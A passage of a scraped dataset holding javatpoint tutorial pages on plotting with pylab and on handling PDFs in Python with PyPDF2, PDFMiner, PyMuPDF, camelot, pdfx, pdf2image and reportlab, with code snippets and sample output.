curve with a and b variable', ""plot(a, b, '^')"", '# Showing curve in the output', '# Importing from Numpy', 'from numpy import *', '# Importing from PyLab', 'from pylab import *', '# X-axis of the curve', 'a = linspace(-4, 8, 32)', '# Y-axis of the curve', 'b = a ** 3', '# Plotting the curve with a and b variable', ""plot(a, b, 'y')"", '# Showing curve in the output', '# Importing from Numpy', 'from numpy import *', '# Importing from PyLab', 'from pylab import *', '# X-axis of the curve', 'a = linspace(-3, 3, 30)', '# Y-axis of the curve', 'b = a ** 2', '# Plotting the curve with a and b variable', ""plot(a, b, 'm+')"", '# Showing curve in the output', '# Importing from Numpy', 'from numpy import *', '# Importing from PyLab', 'from pylab import *', '# Defining multiple variables for multiple plot() function', 'a = linspace(2, 3, 4, 5)', 'b = linspace(1, 2, 3, 4)', 'c = linspace(3, 5, 7, 9)', 'x = a ** 2', 'y = b ** 2', 'z = c ** 2', '# Using plot() function multiple times', ""plot(a, x, 'y-')"", ""plot(b, y, 'c--')"", ""plot(c, z, 'g.')"", '# Showing curve in the output']",[],"['Symbols|||_, |, p, H, h, 4, 3, 2, 1, d, D, x, +, s, <, >, v, ^, o, ., ,, -, -., --.', 'Colour codes|||w, k, y, m, c, r, g, b']",[]
376,['Working with PDF files in Python'],"['As in today\'s world, we all are familiar with PDF files because they are one of the most widely used digital formats of documents. The full form of pdf is ""Portable Document Format,"" which uses the "".pdf"" extension to save the document files. This is independent of software-hardware or operating systems, and it can be used for presenting or exchanging documents reliably.']","['https://www.javatpoint.com/pdf-handling-in-python', 'https://www.javatpoint.com/python-pylab-module', 'https://www.javatpoint.com/pdf-handling-in-python', 'https://www.javatpoint.com/python-pylab-module', 'https://www.javatpoint.com/pdf-handling-in-python']","['https://static.javatpoint.com/python/images/working-with-pdf-files-in-python.png', 'https://static.javatpoint.com/python/images/working-with-pdf-files-in-python2.png', 'https://static.javatpoint.com/python/images/working-with-pdf-files-in-python3.png', 'https://static.javatpoint.com/python/images/working-with-pdf-files-in-python4.png', 'https://static.javatpoint.com/python/images/working-with-pdf-files-in-python5.png', 'https://static.javatpoint.com/python/images/working-with-pdf-files-in-python6.png']",[],"['Installation', 'Operations on PDF File using PyPDF2 Module', 'Conclusion']","['1. How to Extract Text from PDF Document File.', '2. How to Rotate PDF File Pages', '3. How to Merge two PDF Files.', '4. How to Split PDF File', '5. How to Add Watermark to PDF Pages.']",[],"['In this tutorial, we will discuss how we can perform various operations:', 'We can perform all these operations by using a simple Python script.', 'For installing PyPDF2 we can use the following command from the command line:', 'In this section, we will discuss various operations that we can perform on PDF files by using the PyPDF2 module in Python.', 'We can extract the text from the PDF file by using the PyPDF2 module in Python by using the following approach.', 'For extracting the text from the PDF file using Python, we will follow the following steps:', 'Step 1: We will open the PDF file named \'exp.pdf\' in binary mode and save the file object as ""pdf_File_Object"".', 'Step 3: For getting the number of pages in the PDF document file, we will use the numPages', 'Step 5: We will use extract text which is a function of page object for extracting text from the PDF page.', 'Step 6: At last, we will close the PDF document file object.', 'This has printed the text of the first page of the PDF file in output.', 'We can rotate the pages of PDF file using PyPDF2 module in Python.', 'For rotating the pages of the given pdf file, we will be using the following steps:', 'Step 1: We will create a PDF reader object for the original PDF.', 'Step 4: We will add pages PDF writer object using the addPage() function of the PDF writer class by passing the rotated page object.', 'Step 6: We will close the original PDF file object end the newly created new file object.', 'Original File:', 'Rotated File:', 'We can merge two PDF files by using the PyPDF2 module in Python.', 'For merging two PDF files in Python, we will be using the following steps:', 'Step 1: For merging two PDf files, we will be using a pre-built class, pdfFileMerger of the PyPDF2', 'Step 2: Then, we will append the file object of each PDF to the PDF merger object using the append()', 'Step 3: At last, we will write the pdf pages to the output pdf file by using the write method of the PDF merger object.', 'The output of this code will be in the form of a combined PDF named combined_exp.pdf, which is obtained by merging exp.pdf and rotate_exp.pdf file.', 'We can split the PDF document file in Python using the PyPDF2 module according to our requirements.', 'We can add watermark to the pages of PDF document files using the PyPDF2 module in Python.', 'In this, we will follow every step same as the page rotation example, the only difference is:', 'The page object will be converted into the watermark page object by using the add_watermark() function.', 'For understanding what the add_watermark() function do, we can see the following example:', 'water_mark.pdf:', 'user_watermark.pdf file:', 'The above code will generate a user_Watermark.pdf file which has the watermark of the water_mark.pdf file.', ""In this tutorial, we have discussed how we can operate different functions on PDF files using Python and its modules' functions and methods.""]","['For interacting with PDF files, we will be using a 3rd party module, that is, PyPDF2. The PyPDF2 is an inbuilt library of Python, which is used as a PDF toolkit. This module is capable of:', 'The name of this module is case-sensitive, so we have to make sure that the ""y"" is in lowercase and everything in the name of the module is in uppercase.', 'Step 2: We will create an object ""pdf_Reader"" for the ""PDFFileReader"" class of the ""PyPDF2"" module, and then we will pass the PDF file object and get the object for reading the PDF.', 'Step 4: We will create an object ""page_Object"" for PageObject class of the ""PyPDF2"" The PDF reader object has the function ""getPage()"" which takes the page number as an argument and returns the object of the page.', 'Step 2: We will write the rotated pages to the new PDF file. For writing Into the PDF file, we will use the object of the pdfFileWriter class of the PyPDF2', 'Step 3: We will iterate each page of the original PDF document file. We will get page object getPage() function of the PDF reader class. then we will rotate the page by using the rotateClockwise() function of the page object class.', 'Step 5: Then, we will write the PDF pages to the newly created PDF file. We can do this by opening the new file object and writing PDF pages by using the write() function off the PDF writer object.', 'In this code, we will not use a new function or class, and we will be using simple logic and iterations. The splits of the pdf will be created according to the list of splits_1 we would be passing. ', 'The output of this code will generate 3 new pdf files, which are the split files of the main pdf. We can check in the PDF folder. It contains 3 new pdf files. ']","['PDF was invented by Adobe, and this is now an open standard maintained by the international organization for standardization. The PDF file can also contain links or buttons form fields, audio-video, or other business logic for better interaction with the users or the viewers.', 'In this, first, we created a pdf reader object of the water_mark.pdf file. For the passed page object, we have used the mergepage() function, which has passed the page object of the first page of the water_mark pdf reader object. This will cause an overlay of water_mark pdf over the passed page object. ']","['!pip3 install PyPDF2', ""pdf_File_Object = open('exp.pdf', 'rb')"", 'pdf_Reader = PDF.PdfFileReader(pdf_File_Object)', 'print(""No. of pages in the given PDF file: "", pdf_Reader.numPages)', 'page_Object = pdf_Reader.getPage(0)', 'pdf_File_Object.close()', 'import PyPDF2 as PDF', '# Here we will create a pdf file object', ""pdf_File_Object = open('exp.pdf', 'rb')"", '# Here, we will creat a pdf reader object', 'pdf_Reader = PDF.PdfFileReader(pdf_File_Object)', '# Now we will print number of pages in pdf file', 'print(""No. of pages in the given PDF file: "", pdf_Reader.numPages)', '# Here, create a page object', 'page_Object = pdf_Reader.getPage(0)', '# Now, we will extract text from page', 'print(page_Object.extractText())', '# At last, close the pdf file object', 'pdf_File_Object.close()', 'pdf_Writer = PDF.PdfFileWriter()', 'for page in range(pdf_Reader.numPages):', 'page_Object = pdf_Reader.getPage(page)', 'page_Object.rotateClockwise(rotation_1)', 'pdf_Writer.addPage(page_Object)', ""new_File = open(new_File_Name, 'wb')"", 'pdf_Writer.write(new_File)', 'pdf_File_Object.close()', 'new_File.close()', '# Frst, we will import the modules', 'import PyPDF2 as PDF', 'def PDF_rotate(original_File_Name, new_File_Name, rotation_1):', '# Then, we will create a pdf File object of original pdf', ""pdf_File_Object = open(original_File_Name, 'rb')"", '# Then, we will create a pdf Reader object', 'pdf_Reader = PDF.PdfFileReader(pdf_File_Object)', '# Then we will create a pdf writer object for new pdf', 'pdf_Writer = PDF.PdfFileWriter()', '# Now, we will rotate each page of the PDF document', 'for page in range(pdf_Reader.numPages):', '# Then, we will create rotated page object', 'page_Object = pdf_Reader.getPage(page)', 'page_Object.rotateClockwise(rotation_1)', '# We will add the rotated page object to pdf writer', 'pdf_Writer.addPage(page_Object)', '# Now we will open a new pdf file object', ""new_File = open(new_File_Name, 'wb')"", '# We will write the rotated pages to new file', 'pdf_Writer.write(new_File)', '# At last, we will close the original pdf file object', 'pdf_File_Object.close()', '# And now, we will close the new pdf file object', 'new_File.close()', 'def main():', '# original pdf file name', ""original_File_Name = 'exp.pdf'"", '# new pdf file name', ""new_File_Name = 'rotated_exp.pdf'"", '# rotation angle', 'rotation_1 = 270', '# calling the PDF_rotate function', 'PDF_rotate(original_File_Name, new_File_Name, rotation_1)', 'if __name__ == ""__main__"":', '# calling the main function', 'main()', 'We will create an object called pdf_Merger of PDF merger class:', 'pdf_Merger = PDF.PdfFileMerger()', 'for pdf in pdf:', 'pdf_Merger.append(pdf)', ""with open(output_1, 'wb') as K:"", 'pdf_Merger.write(K)', '# First, we will import the modules', 'import PyPDF2 as PDF', 'def PDF_merge(pdf, output_1):', '# Here, we will create pdf file merger object', 'pdf_Merger = PDF.PdfFileMerger()', '# now, we will append pdfs one by one', 'for pdf in pdf:', 'pdf_Merger.append(pdf)', '# then, we will write combined pdf to output pdf file', ""with open(output_1, 'wb') as K:"", 'pdf_Merger.write(K)', 'def main():', '# here, we will select the pdf files to merge', ""pdf = ['exp.pdf', 'rotated_exp.pdf']"", '# Here, we will create output pdf file name', ""output_1 = 'combined_exp.pdf'"", '# Now, we will call pdf merge function', 'PDF_merge(pdf = pdf, output_1 = output_1)', 'if __name__ == ""__main__"":', '# At last we will call the main function', 'main()', '# First, we will import the modules', 'import PyPDF2 as PDF', 'def PDF_split(pdf_1, splits_1):', '# here, we will create an input pdf file object', ""pdf_File_Object = open(pdf_1, 'rb')"", '# here, we will create pdf reader object', 'pdf_Reader = PDF.PdfFileReader(pdf_File_Object)', '# Now we will start indexing of first slice', 'start = 0', '# then we will start indexing of last slice', 'end = splits_1[0]', 'for g in range(len(splits_1) + 1):', '# we will create pdf writer object for (g + 1)th split', 'pdf_Writer = PDF.PdfFileWriter()', '', '# output pdf file name', ""output_pdf = pdf_1.split('.pdf')[0] + str(g) + '.pdf'"", '', '# Now, we will add pages to pdf writer object', 'for page_1 in range(start, end):', 'pdf_Writer.addPage(pdf_Reader.getPage(page_1))', '', '# Here, we will write split pdf pages to pdf file', 'with open(output_pdf, ""wb"") as K:', 'pdf_Writer.write(K)', '# Now, we will interchange page split start position for next split', 'start = end', 'try:', '# then, we will set split end position for next split', 'end = splits_1[g + 1]', 'except IndexError:', '# then, we will set split end position for last split', 'end = pdf_Reader.numPages', '', '# Now, we will close the input pdf file object', 'pdf_File_Object.close()', '', 'def main():', '# pdf file to split', ""pdf_1 = 'exp.pdf'"", '# split page positions', 'splits_1 = [2,4]', '# we will call PDF_split function to split pdf', 'PDF_split(pdf_1, splits_1)', 'if __name__ == ""__main__"":', '# at last, we will call the main function', 'main()', 'wm_page_Object = add_watermark(user_watermark, pdf_Reader.getPage(page_1))', ""wm_File_Object = open(wm_File, 'rb')"", 'pdf_Reader = PDF.PdfFileReader(wm_File_Object)', 'page_Object.mergePage(pdf_Reader.getPage(0))', 'wm_File_Object.close()', 'return page_Object', '# First, we will import the modules', 'import PyPDF2 as PDF', 'def add_watermark_1(wm_File, page_Object):', '# here, we will open watermark pdf file', ""wm_File_Object = open(wm_File, 'rb')"", '# Now, we will create pdf reader object of watermark pdf file', 'pdf_Reader = PDF.PdfFileReader(wm_File_Object)', ""# then, we will merge watermark pdf's first page with passed page object."", 'page_Object.mergePage(pdf_Reader.getPage(3))', '# Here, we will close the watermark pdf file object', 'wm_File_Object.close()', '# we will return watermarked page object', 'return page_Object', 'def main():', '# Now, we will create watermark pdf file name', ""user_watermark = 'water_mark.pdf'"", '# original pdf file name', ""original_File_Name = 'exp.pdf'"", '# new pdf file name', ""new_File_Name = 'watermarked_exp.pdf'"", '# now, we will create pdf File object of original pdf', ""pdf_File_Object = open(original_File_Name, 'rb')"", '# here, we will create a pdf Reader object', 'pdf_Reader = PDF.PdfFileReader(pdf_File_Object)', '# create a pdf writer object for new pdf', 'pdf_Writer = PDF.PdfFileWriter()', '# add watermark to each page', 'for page_1 in range(pdf_Reader.numPages):', '# Now, we will create watermarked page object', 'wm_page_Object = add_watermark(user_watermark, pdf_Reader.getPage(page_1))', '', '# then, we will add watermarked page object to pdf writer', 'pdf_Writer.addPage(wm_page_Object)', '# new pdf file object', ""new_File = open(new_File_Name, 'wb')"", '# we will then write watermarked pages to new file', 'pdf_Writer.write(new_File)', '# close the original pdf file object', 'pdf_File_Object.close()', '# close the new pdf file object', 'new_File.close()', 'if __name__ == ""__main__"":', '# call the main function', 'main()']","['No. of pages in the given PDF file:  10', '', 'GUIDELINES', '*', '', '', 'FOR', '', 'RE', '-', 'OPENING OF CAMPUS', '', 'IN VIEW OF COVID', '-', '19 PANDEMIC', '', '(FOR', 'STUDENTS', ')', '', '2021', '-', '22']",[],"['|||How to extract text from PDF|||How to rotate pages of the PDF|||How to merge two PDF together|||How to split a PDF file|||How to add watermarks to the PDF pages||||||It can extract the information of the documents such as title, author name, and many more.|||It can split the pages of the document file.|||It can crop the pages of the PDF document file.|||It can you merge the multiple pages into a single page inside the PDF document file.|||It can encrypt and decrypt PDF files.|||']"
377,['PDF Handling in Python'],"['Python is considered an extremely flexible programming language with a wide range of libraries, and it is a high-level language with easy-to-read and writes syntax. The reach of Python is being expanded in different sectors like Machine Learning, Web Development, Cybersecurity, Application Development, and a lot more. Thus, this programming language is widely chosen among programmers, engineers and developers.']","['https://www.javatpoint.com/manipulating-pdf-using-python', 'https://www.javatpoint.com/working-with-pdf-files-in-python', 'https://www.javatpoint.com/manipulating-pdf-using-python', 'https://www.javatpoint.com/working-with-pdf-files-in-python', 'https://www.javatpoint.com/manipulating-pdf-using-python']",[],[],"['Some Famous Python PDF Libraries', 'Text Extraction from PDFs using Python', 'Image Extraction from PDFs using Python', 'Tables Extraction from PDFs using Python', 'Extracting URLs from PDFs using Python', 'Pages Extraction from PDFs as an Image using Python']","['Installing the PDFMiner Package', 'Installing the PyMuPDF Package', 'Installing the camelot library', 'Installing the pdfx library', 'Installing the pdf2image library']",[],"[""So, let's get started."", 'and a lot more.', 'First of all, we have to install the PDFMiner package.', 'We can install the PDFMiner package using the following command:', 'Once the installation is complete, we will head onto the main part, extracting texts using the PDFMiner library.', 'Let us consider the following example demonstrating the extraction of texts with the help of PDFMiner in Python.', 'Explanation:', 'We can install the PyMuPDF package using the following command:', 'Once the installation is complete, we will head onto the main part, extracting texts using the PyMuPDF library and the fitz module.', 'Let us consider the following example demonstrating the extraction of images in Python.', 'Explanation:', 'We can install the camelot module using the following command with the pip installer:', 'Once the installation is done, let us head on to extracting tables from the PDF files in Python.', 'Explanation:', 'We can install the pdfx library using the following command with the pip installer:', 'Once the installation is complete, let us consider the following example to understand the extraction of URLs from PDFs.', 'Explanation:', 'Let us begin by installing the library.', 'We can use the following command with the pip installer to install the pdf2image library:', 'Once the installation is completed, let us consider the following example to understand the working of the pdf2image library.', 'Explanation:']","['The following tutorial has been divided into different parts in order for us to understand mostly everything related to PDF handling and processing using Python.', 'Python offers a large variety of libraries that are used to manipulate a PDF file. Some famous libraries that are utilized generally while working with PDFs are:', 'PDFMiner is considered one of the robust libraries utilized to perform operations like extracting texts from PDF files. Thus, in the following section, we will demonstrate the usage of PDFMiner for Text Extraction.', 'We are providing ""my_file.pdf"" as a PDF file to be analyzed and executed with the help of the PDFMiner module. We can extract texts from a PDF file using the process_page function.', 'At last, the print(text) function will print out the extracted text from a PDF. So, in this manner, the texts can be extracted from a PDF file using the PDFMiner library.']","['In the following tutorial, we will be working on PDFs with the help of the Python programming language. PDFs, abbreviated for Portable Document Format, is a file format of a document containing texts, tables, images, and many more, which are usually utilized whenever we require to save files that cannot be modified any further or be easily shared or printed. The PDF file format was developed by Adobe in the year 1993 in order to present documents involving the formatted text and images in a way independent of software, applications, operating systems, and hardware.', 'While there are different packages that are utilized in order to perform different functional operations with PDFs in Python, we will only discuss the working of some of the libraries such as PDFMiner, PyPDF2, PyMuPDF, reportlab, and a few more in this tutorial. PyPDF2 is considered one of the widely chosen Python modules to work with PDFs. This package is easy-to-use and offers various features. But when we talk about the extraction of texts, the PDFMiner package is more precise and dependable. PDFMiner was specifically designed for the users to extract texts from PDF files. There are different scenarios where one package is more efficient than the other in different aspects when we take PDF files manipulation into account. Hence, we will discuss different libraries utilized to manipulate PDF files based on their comfort and reliability in this tutorial.', ""PDFs are composed of various contents such as Text, Tables, Images, Forms, and many more. These files are the graphical interpretations of the data. They deliver information on the exact location of a display or a paper. However, they don't have a logical structure specified for sentences or paragraphs and can't adapt themselves when the size of the display alters. The PDFMiner package performs the work for the users by evaluating the layouts and predicting the location of texts and other contents."", 'In the above snippet of code, we have imported the StringIO module from the io library and required functions and classes from the PDFMiner module. We created a StringIO object and used the with statement to open the pdf file from the directory. As per the PDFMiner documentation, PDFPageInterpreter is used to process page contents, while PDFResourceManager is used to store shared resources such as fonts or images. PDFPage is utilized for performing page-by-page analysis of data. LAParams loads up the Layout analysis of characters, textbox, text lines, images, and figures. With the help of these, the TextConverter function helps in converting a PDF document into text.', 'Whenever we want to extract images from PDF, we can utilize PyMuPDF. This library uses an additional module, fitz, which makes the image extraction from a PDF file easier. Before starting to work with the modules directly, let us install the required libraries.', 'In the above snippet of code, we have imported the required modules. We have then loaded the PDF file using the fitz module. Then we go page by page and find the list of images. We have then converted the image bytes in the PDFs to actual images and saved them locally. Thus, in this manner, we have extracted the images out of a PDF file.', 'Tables extraction from PDF files is a bit easy as compared to images and text extraction. Python offers a predefined library known as camelot, which we can use to extract tables. So, before we start implementing the code, it becomes necessary to install the library at first.', 'In the above snippet of code, we have imported the camelot library. We have then extracted the tables from the PDF file using the read_pdf() function of the camelot library and stored them in a variable as a list. At last, we have printed one of the extracted tables using the index value of the table along with the df attribute. Hence, we have successfully extracted tables from PDF files.', 'Extracting URLs is considered as another handy function that Python offers. Python has a predefined library known as ""pdfx"", which is usually utilized to extract URLs from a PDF file. We can utilize the libraries such as PDFMiner, PyPDF2, and many more in order to extract texts and use regular expressions to find out the URLs. Nevertheless, this procedure is long and hectic. Thus, in order to shorten the length of the code, we will be using the pdfx library to extract URLs from a PDF file.', 'In the above snippet of code, we have imported the pdfx library. We have then used the PDFx() function to read the PDF file from the directory. We have then used the get_references_as_dict() function to extract all the URLs available in the input PDF file in the form of a dictionary.', 'In this section, we will understand the extraction of the pages from a PDF file in the form of an image. In order to accomplish the task, we will need another short and simple library known as pdf2image. This library is usually utilized when we want to take the PDF files into images.', 'In the above snippet of code, we have imported the convert_from_path function from the pdf2image library. We have then used the imported function along where we have provided the value 120. This value is known as the DPI or Dots Per Inch. Higher the value, a clearer and bigger-sized image will be formed. We are iterating through each page by saving the pages as JPEG images.']","['$ pip install pdfminer', 'from io import StringIO', 'from pdfminer.converter import TextConverter', 'from pdfminer.layout import LAParams', 'from pdfminer.pdfdocument import PDFDocument', 'from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter', 'from pdfminer.pdfpage import PDFPage', 'from pdfminer.pdfparser import PDFParser', 'O_string = StringIO()', ""with open('my_file.pdf', 'rb') as input_file:"", 'my_parser = PDFParser(input_file)', 'my_doc = PDFDocument(my_parser)', 'rsrcmgr = PDFResourceManager()', 'my_device = TextConverter(rsrcmgr, O_string, laparams = LAParams())', 'my_interpreter = PDFPageInterpreter(rsrcmgr, my_device)', 'for my_page in PDFPage.create_pages(my_doc):', 'my_interpreter.process_page(my_page)', 'print(O_string.getvalue())', '$ pip install pymupdf', '$ pip install fitz', '# PyMuPDF', 'import fitz', 'import io', 'from PIL import Image', '# path to our input file', 'my_file = ""file2.pdf""', '# Input PDF file', 'my_pdf = open(my_file)', 'for page_num in range(len(my_pdf)):', 'cur_page = my_pdf[page_num]', 'img = cur_page.getImageList()', 'for image_num, image in enumerate(cur_page.getImageList()):', '# get the XREF of the image', 'xref = image[0]', '# extract the image bytes', 'cur_image = my_pdf.extractImage(xref)', 'imgBytes = cur_image[""image""]', '# get the image extension', 'img_ext = cur_image[""ext""]', '# load it to PIL', 'image = Image.open(io.BytesIO(imgBytes))', '# save it to local disk', 'image.save(open(f""page{page_num + 1}_img{image_num}.{img_ext}"", ""wb""))', '$ pip install camelot', 'import camelot', '# reading the pdf file', 'my_tables = camelot.read_pdf(""my_table.pdf"")', 'print(my_tables[0].df)', '$ pip install pdfx', 'import pdfx', '# reading the PDF File', 'my_pdf = pdfx.PDFx(""sample-url.pdf"")', '# get list of URLS', 'print(my_pdf.get_references_as_dict())', '$ pip install pdf2image', 'from pdf2image import convert_from_path', 'my_pages = convert_from_path(""my_file.pdf"", 120)', '# iterating through pages', 'for page in my_pages:', 'n += 1', 'page.save(f""output{n}.jpg"", ""JPEG"")']","['A Simple PDF File', 'This is a small demonstration .pdf file -', 'just for use in the Virtual Mechanics tutorials. More text. And more', 'text. And more text. And more text. And more text.', 'And more text. And more text. And more text. And more text. And more', 'text. And more text. Boring, zzzzz. And more text. And more text. And', 'more text. And more text. And more text. And more text. And more text.', 'And more text. And more text.', 'And more text. And more text. And more text. And more text. And more', 'text. And more text. And more text. Even more. Continued on page 2 ...', 'Simple PDF File 2', '...continued from page 1. Yet more text. And more text. And more text.', 'And more text. And more text. And more text. And more text. And more', 'text. Oh, how boring typing this stuff. But not as boring as watching', 'paint dry. And more text. And more text. And more text. And more text.', 'Boring.  More, a little more text. The end, and just as well.', '[+] Found a total of 2 images in page 0', '[+] Found a total of 2 images in page 1', ""{'url': ['https://www.javatpoint.com/python-pass', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-seaborn-library', 'https://www.javatpoint.com/', 'https://www.javatpoint.com/chatbot-in-python', 'https://www.javatpoint.com/python-if-else']}""]",[],"['|||PDFMiner,|||PyPDF4,|||PyPDF2,|||Python-docx,|||PyMuPDF,|||']"
378,['Manipulating PDF using Python'],"['In the previous tutorial, we have discussed various operations that we can perform on a PDF file using different packages and modules of the Python programming language. We have learned the working of different Python libraries which can be used to manipulate PDF files. Moreover, we have understood the extraction of text, images, tables, and URLs using Python.']","['https://www.javatpoint.com/list-all-functions-from-a-python-module', 'https://www.javatpoint.com/pdf-handling-in-python', 'https://www.javatpoint.com/list-all-functions-from-a-python-module', 'https://www.javatpoint.com/pdf-handling-in-python', 'https://www.javatpoint.com/list-all-functions-from-a-python-module']","['https://static.javatpoint.com/python/images/manipulating-pdf-using-python1.png', 'https://static.javatpoint.com/python/images/manipulating-pdf-using-python2.png', 'https://static.javatpoint.com/python/images/manipulating-pdf-using-python3.png', 'https://static.javatpoint.com/python/images/manipulating-pdf-using-python4.png', 'https://static.javatpoint.com/python/images/manipulating-pdf-using-python5.png']",[],"['Creating a PDF file using Python', 'Adding Text on a PDF using Python', 'Adding Image on a PDF using Python', 'Adding Tables on a PDF using Python', 'Highlighting text on a PDF using Python', 'Resizing pages of a PDF using Python', 'Converting a PDF file into CSV using Python']","['Installing the reportlab library', 'Installing the tabula library']",[],"[""So, let's get started."", 'But before we start working with the library, it is necessary for us to install it.', 'We can install the reportlab library using the following command with the pip installer:', 'Now, let us begin with the implementation section; we can perform the following:', 'Explanation:', 'We can easily add a PDF file with the help of the reportlab library. Let us consider the following example to understand the same:', 'Explanation:', 'Let us consider the following example to understand the addition of images on a PDF file:', 'Explanation:', 'Explanation:', 'Explanation:', 'Explanation:', 'Let us begin by installing the Python library called tabula', 'We can install the tabula library using the following command with the pip installer:', 'Explanation:']","['The following tutorial will cover some of the other operations to manipulate a PDF file, including creating a PDF file, adding texts, images, and tables on a PDF file, and a lot more.', 'We can also add tables to the PDF file using the reportlab library. Let us consider the following example to understand the addition of tables on a PDF file.', 'Now, let us understand the implementation of the tabula library in the conversion of a PDF file into CSV format with the help of the following example:', 'There are many other functions that we can perform with a PDF file using a programming language like Python. One can also refer to the official documentation for reference.']","['Python offers a feature where the programmers could also create a PDF file from the code directly. We can insert texts, images, tables, and forms from Python code directly onto a PDF file. In order to accomplish the same, the Python programming language offers a library known as reportlab.', 'In the above snippet of code, we have imported the required functions from their respective modules. We have then created a PDF file called newfile.pdf. Within the Canvas() function, we have set the size of the PDF page to a LETTER size which is a predefined size provided by the reportlab library. We have then saved the created PDF file using the save() function.', 'In the above snippet of code, we have again imported the functions from their respective modules. We have then created a PDF file named textfile.py. We are setting up the fonts and font sizes since we are about to write some text on the PDF file. We have set the PDF size to LETTER, fonts to Courier, and the font size to 18 with the help of predefined functions of reportlab. We have then chosen the purple color for the text with the help of setFillColor function. After this, we have written some text on the PDF file specifying the position of text on the PDF page. At last, we have saved the created PDF file using the save() function. Hence, we have successfully created a PDF file.', 'We can utilize the Python reportlab library in order to insert images on a PDF file as well. Insertion of images can be tedious work as compared to the insertion of texts on a PDF file. Images have their unique sizes and so do PDF files. Thus, managing the size and finding the optimal location for images can be a tedious job.', 'In the above snippet of code, we have imported the required functions. We have then used the Canvas() function to create a new PDF file. We have then used the drawInlineImage() function in order to insert an image to the created PDF file. We have specified the location of the image in the directory along with the position of the image, i.e., (100, 450) to be set on the PDF file. The reportlab library considers the bottom left position of the PDF file as (0, 0) accordingly and manages the position of the image in a similar way. The letter size PDF has the dimension of 612x792, and (100, 450) will be the location of the image on the PDF file.', 'In the above snippet of code, we have created a new PDF file with letter size. The data to be stored on the table is provided on the list ""my_data"". Here, the list\'s shape is 5x2. There are five rows and two columns. Thus, this is the table that will be formed on the PDF file. After that, we defined the table\'s margin, the grid lines, their sizes, and formations. We have also used the setStyle function. One can also refer to the official documentation of the reportlab library for creating a table. If these grid lines were not defined, there would be just the detail on the PDF in an arranged order; however, without being separated by grid lines or borders.', 'Python also offers us the feature order to highlight the text contents on a PDF file known as ""fitz"". Fitz is the simplest library that we can use to perform text highlighting on a PDF file. As we have already discussed the installation procedure for the fitz library, let\'s move directly on to the implementations of the fitz library in order to highlight the texts on a PDF.', 'In the above snippet of code, we have imported the fitz library. We have then used the open() function in order to load the PDF file my_file.pdf, which is to be highlighted. The phrase that is to be highlighted is given on the text variable. We are highlighting the word ""Boring"". We have then iterated through each of the pages to find if there are any potential matches to the word. If we find a match to the word, we have used the add_highlight_annot function from fitz in order to highlight them. Thus, in this manner, we have obtained highlighted text on a PDF file.', 'Resizing a Page is another example of manipulating a PDF file using Python. Sometimes, resizing might be necessary on PDF pages, and Python offers a library known as PyPDF2, using which programmers can perform the function of page resizing. Let us consider the following example to understand the same:', 'In the above snippet of code, we have imported the required library. We have then begun by reading the input PDF file that has to be resized. Then, we have read its pages. Here, we have resized the first page only, so the getPage function is provided the value 0, which stands for the initial page. Now, in order to resize the page, we have used the scaleBy function and scaled the 0th page by 0.5. Thus, the first page is reduced by half the actual dimension of the page. We have then saved the page onto a new PDF file resizedFile.pdf. In this manner, we have successfully performed the page resizing using Python.', 'Sometimes, tabular data is also present in a PDF format. However, these types of information cannot be parsed directly. For instance, we cannot process a PDF file with a data frame directly using the pandas library, and they have to be converted into a CSV or Excel format before processing. Since this is quite a significant process, we will understand how we can convert a PDF file into a CSV format.', 'In the following snippet of code, we have imported the tabula library. We have then used a one-line function called ""convert_into"", specifying the parameters as the path to the input PDF file, the path to which the file has to be converted, the format of the Output file, and the number of pages we wanted to convert. In this manner, we can convert a PDF file into a CSV format easily and effectively.']","['$ pip install reportlab', 'from reportlab.lib.pagesizes import LETTER', 'from reportlab.pdfgen.canvas import Canvas', '# creating a new pdf file', 'my_canvas = Canvas(""newfile.pdf"", pagesize = LETTER)', 'my_canvas.save()', 'from reportlab.lib.pagesizes import LETTER', 'from reportlab.lib.units import inch', 'from reportlab.pdfgen.canvas import Canvas', 'from reportlab.lib.colors import purple', '# creating the pdf file', 'my_canvas = Canvas(""textfile.pdf"", pagesize = LETTER)', '# setting up the font and the font size', 'my_canvas.setFont(""Courier"", 18)', '# setting up the color of the font as red', 'my_canvas.setFillColor(purple)', '# writing this text on the PDF file', 'my_canvas.drawString(2 * inch, 8 * inch, ""Welcome to Javatpoint for Python Tutorial"")', 'my_canvas.save()', 'from reportlab.lib.pagesizes import LETTER', 'from reportlab.pdfgen.canvas import Canvas', 'my_canvas = Canvas(""imgfile.pdf"", pagesize = LETTER)', 'my_canvas.drawInlineImage(""my_image.jpg"", 100, 450)', 'my_canvas.save()', 'from reportlab.lib import colors', 'from reportlab.lib.pagesizes import letter, inch', 'from reportlab.platypus import SimpleDocTemplate, Table, TableStyle', '# creating a pdf file to add tables', 'my_doc = SimpleDocTemplate(""table.pdf"", pagesize = letter)', 'my_obj = []', '# defining Data to be stored on table', 'my_data = [', '[""ID"", ""1234""],', '[""Name"", ""Den Arthur""],', '[""Profession"", ""Software Developer""],', '[""Age"", ""28""],', '[""Sex"", ""Male""]', '# Creating the table with 5 rows', 'my_table = Table(my_data, 1 * [1.6 * inch], 5 * [0.5 * inch])', '# setting up style and alignments of borders and grids', 'my_table.setStyle(', 'TableStyle(', '[', '(""ALIGN"", (1, 1), (0, 0), ""LEFT""),', '(""VALIGN"", (-1, -1), (-1, -1), ""TOP""),', '(""ALIGN"", (-1, -1), (-1, -1), ""RIGHT""),', '(""VALIGN"", (-1, -1), (-1, -1), ""TOP""),', '(""INNERGRID"", (0, 0), (-1, -1), 1, colors.black),', '(""BOX"", (0, 0), (-1, -1), 2, colors.black),', ']', 'my_obj.append(my_table)', 'my_doc.build(my_obj)', 'import fitz', '# opening the pdf file', 'my_pdf = fitz.open(""my_file.pdf"")', '# input text to be highlighted', 'my_text = ""Boring""', '# iterating through pages for highlighting the input phrase', 'for n_page in my_pdf:', 'matchWords = n_page.search_for(my_text)', 'for word in matchWords:', 'my_highlight = n_page.add_highlight_annot(word)', 'my_highlight.update()', '# saving the pdf file as highlighted.pdf', 'my_pdf.save(""highlighted_text.pdf"")', 'import PyPDF2', 'myPDF = ""my_file.pdf""', 'myPDF = PyPDF2.PdfFileReader(myPDF)', 'my_page = myPDF.getPage(0)', '# Resizing the first page', 'my_page.scaleBy(0.5)', 'my_resized = PyPDF2.PdfFileWriter()', 'my_resized.addPage(my_page)', 'with open(""resizedFile.pdf"", ""wb+"") as f:', 'my_resized.write(f)', '$ pip3 install tabula-py', 'import tabula', 